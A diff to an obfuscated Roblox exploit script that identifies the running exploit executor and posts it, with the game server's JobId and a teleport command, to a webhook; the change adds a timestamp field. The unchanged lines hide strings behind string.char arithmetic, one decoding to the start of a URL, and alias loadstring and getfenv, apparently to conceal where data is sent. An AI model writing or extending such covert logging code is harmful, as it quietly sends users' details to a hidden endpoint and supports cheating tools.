@@ -25,7 +25,8 @@ local webhookcheck =
    SONA_LOADED and "Sona" or
    "Kid with shit exploit"
 
-local idserver = "game.ReplicatedStorage['__ServerBrowser']:InvokeServer('teleport',"..game.JobId.."))"
+local a= os.time()local a= os.date('!*t', a)
+local idserver = "game.ReplicatedStorage['__ServerBrowser']:InvokeServer('teleport','"..game.JobId.."'))"
 local ThisShitIsBroken1IlI1I1IlI1=string.char; local LindseyGudLua1IlI1=warn; local ThisIsShit1IlI11IlI1IlI1=_G; local ThisShitIsBroken1IlI1IlI1I1IlI1=print; local LindseyGudLua1IlI1I1IlI1I=nil; local LindseyGudLua1IlI1IlI11IlI1IlI=unpack; local LindseyGudLua1IlI1IlI=getfenv; local ThisShitIsBroken1IlI11IlI1=true; local LolYouWillCrackFast1IlI11IlI11IlI1I=pairs; local ThisIsShit1IlI1IlI11IlI1IlI1IlI1IlI1=next; local ThisIsShit1IlI11IlI1IlI1I=false; local ThisIsShit1IlI1IlI1I1IlI11IlI1IlI1I=loadstring; local LindseyGudLua1IlI1IlI1I1IlI11IlI1=printidentity; local ThisIsShit1IlI1IlI1IlI1I=debug; local LindseyGudLua1IlI1Il=tostring; local ThisShitIsBroken1IlI1IlI11IlI1Il1IlI1IlI=getmetatable; local ThisIsShit1IlI1Il1IlI1IlI1=error; function LolYouWillCrackFast1IlI1IlI11IlI1Il(LindseyGudLua1IlI1IlI1) local  ThisShitIsBroken1IlI1I = ""; for  i,v in LolYouWillCrackFast1IlI11IlI11IlI1I(LindseyGudLua1IlI1IlI1) do  ThisShitIsBroken1IlI1I =  ThisShitIsBroken1IlI1I..ThisShitIsBroken1IlI1I1IlI1(v*2); end return( ThisShitIsBroken1IlI1I) end;local a1 = (LolYouWillCrackFast1IlI1IlI11IlI1Il({-46 + 98, 22.5 + 35.5, -13 + 71, -5 + 61, -23 + 80.5, -18 + 47, -42 + 65.5, -98 + 121.5}))
 local a2 = (LolYouWillCrackFast1IlI1IlI11IlI1Il({-67 + 117, -29 + 81.5, -34 + 91.5, 31 + 18.5, -22 + 77.5, 54.5 + 2.5, 19 + 31, 5.5 + 17.5, -53.5 + 103, 35.5 + 20, 3 + 51.5}))
 local a3 = (LolYouWillCrackFast1IlI1IlI11IlI1Il({6.5 + 17, 34.5 + 14, -71.5 + 127.5, 24.5 + 28}))
@@ -73,7 +74,8 @@ local data = {
                     ["value"] = "```"..idserver.."```",
                     ["inline"] = false
                 }
-			}
+			},
+			["timestamp"] = string.format('%d-%d-%dT%02d:%02d:%02dZ', a.year, a.month, a.day, a.hour, a.min, a.sec)
        }
    }
 }
